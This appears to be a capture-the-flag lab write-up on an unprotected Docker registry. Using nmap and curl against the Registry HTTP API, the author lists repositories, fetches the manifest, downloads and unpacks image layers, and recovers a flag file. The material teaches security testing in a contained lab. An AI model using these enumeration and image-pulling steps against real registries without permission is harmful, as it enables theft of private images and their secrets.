#### 2. Insecure Docker Registry II

----

- An unprotected private Docker registry is on the same network as your Kali machine. There is only one docker image present in the registry which contains the flag.
- Objective: Fetch the image from the private Docker registry, analyze it and retrieve the flag!  No docker clients are provided and this exercise needs to be solved using first principles using curl.

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2395: eth0@if2396: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
2398: eth1@if2399: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:7f:ed:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.127.237.2/24 brd 192.127.237.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

```sh
root@attackdefense:~# nmap -sV -sC 192.127.237.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 05:36 UTC
Nmap scan report for hn0l2pvt7ea2r7fivpjt46jc8.temp-network_a-127-237 (192.127.237.3)
Host is up (0.000013s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
MAC Address: 02:42:C0:7F:ED:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.82 seconds
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.127.237.3:5000
```

```sh
root@attackdefense:~# curl http://192.127.237.3:5000/v2/_catalog
{"repositories":["treasure-trove"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.127.237.3:5000/v2/treasure-trove/tags/list
{"name":"treasure-trove","tags":["latest"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.127.237.3:5000/v2/treasure-trove/manifests/latest
{
   "schemaVersion": 1,
   "name": "treasure-trove",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"ArgsEscaped\":true,\"Image\":\"sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) COPY file:96c69e5db7e6d87db2a51d3894183e9e305a144c73659d5578d300bd2175b5d6 in /etc/network/if-post-up.d \"],\"ArgsEscaped\":true,\"Image\":\"sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2019-05-13T14:06:51.794876531Z\",\"docker_version\":\"18.09.4\",\"id\":\"911999e848d2c283cbda4cd57306966b44a05f3f184ae24b4c576e0f2dfb64d0\",\"os\":\"linux\",\"parent\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\",\"parent\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.510395965Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.358250803Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:a86aea1f3a7d68f6ae03397b99ea77f2e9ee901c5c59e59f76f93adbb4035913 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "NGH6:TOKB:ZLRH:6EXQ:ENAX:46LM:SOZN:4YHI:BING:MVND:PTDI:UB7L",
               "kty": "EC",
               "x": "WezZV6zizMDaBWqjjJztOT_NC2los-53jIq7wETll7Q",
               "y": "zejWfU-YsljcTyuy7PWCyjM2mRwibyHfF3I6fD9XRZ0"
            },
            "alg": "ES256"
         },
         "signature": "OSCUrvrSKKsxseWcT5_PmOnR3410qx86HCXuUfz0zOYy3RGUU_KjGjRyoEEiohDOu9lC3rtGN6bNIhiP66m9gA",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI1NjQsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAxOS0wNy0yNFQwNTozOTo0M1oifQ"
      }
   ]
}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -s http://192.127.237.3:5000/v2/treasure-trove/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output 1.tar
root@attackdefense:~# curl -s http://192.127.237.3:5000/v2/treasure-trove/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 --output 2.tar
root@attackdefense:~# curl -s http://192.127.237.3:5000/v2/treasure-trove/blobs/sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10 --output 3.tar
```

```sh
root@attackdefense:~# ls -l *.tar
-rw-r--r-- 1 root root     218 Jul 24 05:48 1.tar
-rw-r--r-- 1 root root      32 Jul 24 05:49 2.tar
-rw-r--r-- 1 root root 2757034 Jul 24 05:49 3.tar
root@attackdefense:~#
```

```sh
root@attackdefense:~# mv *.tar compress/
root@attackdefense:~# cd compress/
```

```sh
root@attackdefense:~/compress# tar -xf 1.tar
root@attackdefense:~/compress# tar -xf 2.tar
root@attackdefense:~/compress# tar -xf 3.tar
```

```sh
root@attackdefense:~/compress# ls -l
total 2772
-rw-r--r--  1 root root     218 Jul 24 05:48 1.tar
-rw-r--r--  1 root root      32 Jul 24 05:49 2.tar
-rw-r--r--  1 root root 2757034 Jul 24 05:49 3.tar
drwxr-xr-x  2 root root    4096 May  9 20:49 bin
drwxr-xr-x  2 root root    4096 May  9 20:49 dev
drwxr-xr-x 15 root root    4096 May  9 20:49 etc
drwxr-xr-x  2 root root    4096 May  9 20:49 home
drwxr-xr-x  5 root root    4096 May  9 20:49 lib
drwxr-xr-x  5 root root    4096 May  9 20:49 media
drwxr-xr-x  2 root root    4096 May  9 20:49 mnt
drwxr-xr-x  2 root root    4096 May  9 20:49 opt
dr-xr-xr-x  2 root root    4096 May  9 20:49 proc
drwx------  2 root root    4096 May  9 20:49 root
drwxr-xr-x  2 root root    4096 May  9 20:49 run
drwxr-xr-x  2 root root    4096 May  9 20:49 sbin
drwxr-xr-x  2 root root    4096 May  9 20:49 srv
drwxr-xr-x  2 root root    4096 May  9 20:49 sys
drwxrwxrwt  2 root root    4096 May  9 20:49 tmp
drwxr-xr-x  7 root root    4096 May  9 20:49 usr
drwxr-xr-x 11 root root    4096 May  9 20:49 var
root@attackdefense:~/compress#
```

```sh
root@attackdefense:~/compress# find . -name *flag* 2>/dev/null
./etc/network/if-post-up.d/flag.txt
root@attackdefense:~/compress# 
```

```sh
root@attackdefense:~/compress# cat ./etc/network/if-post-up.d/flag.txt
c09f6e2ecff56dcae50c02c6a4d355fe
root@attackdefense:~/compress#
```

----

###### References

- [Exploring Docker Manifests](https://thepracticalsysadmin.com/exploring-docker-manifests/)
- [Docker Multi-Architecture Images](https://medium.com/@mauridb/docker-multi-architecture-images-365a44c26be6)
- [docker manifest](https://docs.docker.com/engine/reference/commandline/manifest/)
- [Docker Registry HTTP API V2](https://docs.docker.com/registry/spec/api/)

----

----

EOF